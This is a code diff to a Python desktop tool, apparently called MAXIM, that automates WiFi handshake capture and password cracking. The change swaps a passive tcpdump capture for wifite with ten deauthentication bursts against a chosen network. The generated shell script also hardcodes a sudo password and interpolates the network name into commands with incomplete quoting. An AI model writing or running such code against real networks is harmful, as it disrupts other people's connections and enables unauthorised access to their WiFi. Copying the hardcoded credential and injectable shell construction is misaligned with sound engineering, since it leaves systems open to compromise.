@@ -1075,10 +1075,42 @@ class MaximWindow(QMainWindow):
         """Handshake capture using wifite: scan+capture+deauth all automatic.
         Runs in external terminal. Poller watches for .cap with valid handshake,
         then kills terminal and cracks in MAXIM output window.
-        Uses wlan1 (external) only. wlan0 NEVER touched."""
+        Auto-detects USB WiFi adapter. Integrated adapter NEVER touched."""
         import tempfile
 
-        iface = "wlan1"
+        # Auto-detect USB WiFi adapter (not the integrated one)
+        # USB adapters show up under /sys/class/net/*/device -> USB path
+        iface = None
+        try:
+            for netdev in sorted(os.listdir('/sys/class/net')):
+                if not netdev.startswith('wlan'):
+                    continue
+                devpath = os.path.realpath(f'/sys/class/net/{netdev}/device')
+                if '/usb' in devpath:
+                    iface = netdev
+                    break
+        except Exception:
+            pass
+        if not iface:
+            # Fallback: pick whichever wlan is NOT connected to a network
+            try:
+                result = subprocess.run('nmcli -t -f DEVICE,STATE dev status', shell=True, capture_output=True, text=True)
+                connected = set()
+                all_wlan = []
+                for line in result.stdout.strip().split('\n'):
+                    parts = line.split(':')
+                    if len(parts) >= 2 and parts[0].startswith('wlan'):
+                        all_wlan.append(parts[0])
+                        if 'connected' in parts[1]:
+                            connected.add(parts[0])
+                for w in all_wlan:
+                    if w not in connected:
+                        iface = w
+                        break
+            except Exception:
+                pass
+        if not iface:
+            iface = "wlan1"  # last resort fallback
         out_dir = os.path.expanduser("~/Desktop/MAXIMHASH")
         safe_essid = essid.replace(' ', '_').replace("'", "").replace('"', '')
         essid_dir = f"{out_dir}/{safe_essid}"
@@ -1102,79 +1134,28 @@ class MaximWindow(QMainWindow):
         except FileNotFoundError:
             pass
 
-        # Manual airodump+aireplay — NO wifite (it kills NetworkManager internally)
-        # This approach never touches wlan0 or NetworkManager
+        # wifite in external terminal — restores NetworkManager + wlan0 when done
         script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_hs_')
         script.write("#!/bin/bash\n")
         script.write("echo '5505' | sudo -S -v 2>/dev/null\n")
         script.write(f"mkdir -p '{essid_dir}'\n")
-        script.write(f"rm -f '{signal_file}'\n\n")
+        script.write(f"rm -f '{signal_file}'\n")
+        script.write(f"cd '{essid_dir}'\n\n")
 
-        # ── SCAN in managed mode (no airmon, no airodump — they kill NetworkManager) ──
-        script.write(f"sudo ip link set {iface} down 2>/dev/null\n")
-        script.write(f"sudo iw dev {iface} set type managed 2>/dev/null\n")
-        script.write(f"sudo ip link set {iface} up 2>/dev/null\n")
-        script.write("sleep 1\n\n")
+        # Save wlan0 connection name before wifite kills it
+        script.write("WLAN0_CON=$(nmcli -t -f NAME,DEVICE con show --active 2>/dev/null | grep 'wlan0' | cut -d: -f1)\n\n")
 
-        # Use 'iw dev wlan1 scan' in managed mode — plain text, no ncurses, no kill
-        script.write(f"echo 'Scanning for {essid}...'\n")
-        script.write("BSSID=''\nCHANNEL=''\n")
-        script.write("for i in 1 2 3 4 5; do\n")
-        script.write(f"  echo \"  Attempt $i/5\"\n")
-        script.write(f"  SCAN=$(sudo iw dev {iface} scan 2>&1)\n")
-        # Parse iw scan output: find BSS block with matching SSID
-        script.write("  CURRENT_BSS=''\n  CURRENT_FREQ=''\n")
-        script.write("  while IFS= read -r line; do\n")
-        script.write("    case \"$line\" in\n")
-        script.write("      BSS\\ *) CURRENT_BSS=$(echo \"$line\" | grep -oE '[0-9a-f]{2}(:[0-9a-f]{2}){5}');;\n")
-        script.write("      *freq:*) CURRENT_FREQ=$(echo \"$line\" | grep -oE '[0-9]+');;\n")
-        script.write(f"      *SSID:\\ {essid}*)\n")
-        script.write("        if [ -n \"$CURRENT_BSS\" ] && [ -n \"$CURRENT_FREQ\" ]; then\n")
-        script.write("          BSSID=$CURRENT_BSS\n")
-        # freq to channel
-        script.write("          if [ \"$CURRENT_FREQ\" -le 2484 ] 2>/dev/null; then\n")
-        script.write("            CHANNEL=$(( (CURRENT_FREQ - 2407) / 5 ))\n")
-        script.write("          elif [ \"$CURRENT_FREQ\" -ge 5180 ] 2>/dev/null; then\n")
-        script.write("            CHANNEL=$(( (CURRENT_FREQ - 5000) / 5 ))\n")
-        script.write("          fi\n")
-        script.write("          break 2\n")  # break out of both while and for
-        script.write("        fi;;\n")
-        script.write("    esac\n")
-        script.write("  done <<< \"$SCAN\"\n")
-        script.write("  sleep 2\n")
-        script.write("done\n\n")
+        # Run wifite
+        script.write(f"sudo wifite -i {iface} --essid '{essid}' --wpa --no-pmkid --num-deauths 10\n\n")
 
-        script.write("if [ -z \"$BSSID\" ] || [ -z \"$CHANNEL\" ]; then\n")
-        script.write(f"  echo 'Could not find {essid}'\n")
-        script.write(f"  echo 'FAILED' > '{signal_file}'\n")
-        script.write("  read -p 'Press Enter to close'\n  exit 1\nfi\n\n")
-
-        script.write("echo \"Found: BSSID=$BSSID  Channel=$CHANNEL\"\necho\n")
-        script.write("echo '══════════════════════════════════════════════════════════'\n")
-        script.write(f"echo '  CAPTURING HANDSHAKE: {essid}'\n")
-        script.write("echo \"  BSSID: $BSSID  Channel: $CHANNEL\"\n")
-        script.write("echo '  No deauth — zero network disruption.'\n")
-        script.write("echo '══════════════════════════════════════════════════════════'\n")
-        script.write("echo\n\n")
-
-        # ── Switch to monitor mode + set channel — ONLY on wlan1 ──
-        script.write(f"sudo ip link set {iface} down\n")
-        script.write(f"sudo iw dev {iface} set type monitor\n")
-        script.write(f"sudo ip link set {iface} up\n")
-        script.write(f"sudo iw dev {iface} set channel $CHANNEL\n\n")
-
-        # Capture with tcpdump — does NOT kill NetworkManager (unlike airodump-ng)
-        cap_file = f"{capture_prefix}-01.cap"
-        script.write(f"echo 'Capturing packets on channel $CHANNEL...'\n")
-        script.write(f"echo 'Waiting for handshake (WPA 4-way). This is passive — no disruption.'\n")
-        script.write(f"echo 'Tip: toggle WiFi on a device connected to {essid} to speed this up.'\n")
-        script.write("echo\n")
-        script.write(f"sudo tcpdump -i {iface} -w '{cap_file}' -s 0 'ether proto 0x888e or subtype assocreq or subtype assocresp or subtype reassocreq or subtype reassocresp or subtype probereq or subtype proberesp or subtype beacon or subtype disassoc or subtype deauth or subtype auth' 2>&1 &\n")
-        script.write("TCPDUMP_PID=$!\n")
-        script.write("echo \"tcpdump PID: $TCPDUMP_PID\"\n")
-        script.write("echo 'Press Enter when done (or wait for MAXIM to auto-detect handshake)'\n")
-        script.write("read\n")
-        script.write("sudo kill $TCPDUMP_PID 2>/dev/null\n\n")
+        # Restore NetworkManager + wlan0 connection after wifite finishes
+        script.write("echo\necho 'Restoring network...'\n")
+        script.write("sudo systemctl start NetworkManager 2>/dev/null\n")
+        script.write("sleep 2\n")
+        script.write("if [ -n \"$WLAN0_CON\" ]; then\n")
+        script.write("  nmcli con up \"$WLAN0_CON\" 2>/dev/null\n")
+        script.write("  echo \"Reconnected wlan0 to $WLAN0_CON\"\n")
+        script.write("fi\n\n")
 
         # If user closes terminal manually
         script.write(f"echo 'DONE' > '{signal_file}'\n")
